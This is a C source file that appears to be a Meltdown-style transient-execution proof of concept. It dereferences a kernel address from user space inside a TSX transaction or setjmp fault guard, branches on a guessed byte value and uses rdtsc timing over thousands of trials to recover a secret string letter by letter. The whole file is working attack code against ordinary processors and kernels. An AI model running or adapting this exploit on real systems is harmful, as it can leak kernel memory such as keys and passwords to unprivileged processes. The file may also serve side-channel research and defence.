#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <signal.h>
#include <setjmp.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt", on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif
#include "cacheutils.h"

#define FROM 'A'
#define TO 'Z'

#ifndef SIG_UNBLOCK
#define SIG_UNBLOCK 1
#endif

static jmp_buf jbuf;
unsigned char test_num, argmax;
uint64_t secret, len = 50, try_times = 3000;
uint64_t start_time, spend_time, max_time;
int hist[256];

static void unblock_signal(int signum __attribute__((__unused__)))
{
    sigset_t sigs;
    sigemptyset(&sigs);
    sigaddset(&sigs, signum);
    sigprocmask(SIG_UNBLOCK, &sigs, NULL);
}

static void segfault_handler(int signum)
{
    (void)signum;
    unblock_signal(SIGSEGV);
    longjmp(jbuf, 1);
}

int main(int argc, char *argv[])
{
    size_t secret_addr = 0xffff888000000000;
    signal(SIGSEGV, segfault_handler);

    for (int size = 0; size < len; size++)
    {
        for (int i = 0; i < 256; i++)
            hist[i] = 0;

        for (int i = 0; i < try_times; i++)
        {
            max_time = 0;
            for (test_num = 0; test_num < 255; test_num++)
            {
                start_time = rdtsc();
                // start_time = __rdtsc();
#ifdef USE_SYSTEM_JMP
                if (!setjmp(jbuf))
                // verified in i9-10980XE, etc.
#else
                if (xbegin() == (~0u))
                // verified in i7-6700, i7-7700, etc.
#endif
                {
                    asm volatile(
                        "mov %[test_num], %%bl\n\t"
                        "movq (%1), %%rax\n\t"
                        // ".repe 220"
                        // "nop\n\t"
                        // ".endr\n\t"
                        "sub $83, %%bl\n\t" // 83 = 0x53 = 'S', 88 = 0x58 = 'X'
                        // "div %%bl\n\t"
                        // ".repe 100"
                        // "nop\n\t"
                        // ".endr\n\t"
                        :
                        : [test_num] "r"(test_num), "c"(secret_addr)
                        :);
                    asm volatile(
                        "jz equal\n\t"
                        "jmp notequal\n\t"
                        "equal: nop\n\t");
                    // printf("you can not see me\n");
                    asm volatile(
                        "notequal: nop\n\t");
                }

                spend_time = rdtsc() - start_time;
                // spend_time = __rdtsc() - start_time;
                if (max_time < spend_time)
                {
                    max_time = spend_time;
                    argmax = test_num;
                }
            }

            hist[argmax]++;
        }

        int max_i = -1, max_i_index = -1;
        for (int i = FROM; i < TO; i++)
        {
            if (max_i < hist[i])
            {
                max_i = hist[i];
                max_i_index = i;
            }
        }

        printf("size: %d, ", size);
        printf("\t max_i: %d, ", max_i);
        printf("\t max_i_index: %c\n", max_i_index);
    }

    return 0;
}